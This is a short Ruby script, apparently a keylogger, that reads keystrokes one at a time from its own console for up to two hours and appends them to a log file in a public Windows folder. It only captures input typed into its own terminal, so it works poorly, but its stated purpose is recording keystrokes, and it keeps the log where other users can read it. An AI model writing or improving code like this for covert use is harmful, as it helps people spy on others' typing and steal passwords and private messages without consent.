require 'io/console'

# Set the maximum logging time in seconds
MAX_LOG_TIME = 7200 # 2 hours

# Set the file path for the log file
LOG_FILE_PATH = "C:/Users/Public/keylog.txt"

# Initialize the log file
File.open(LOG_FILE_PATH, "w") do |file|
  file.truncate(0)
end

# Set the start time
start_time = Time.now

# Loop until the maximum logging time is reached or the terminal is closed
while (Time.now - start_time) < MAX_LOG_TIME
  # Read a single keystroke
  keystroke = STDIN.getch

  # Append the keystroke to the log file
  File.open(LOG_FILE_PATH, "a") do |file|
    file.puts(keystroke)
  end
end
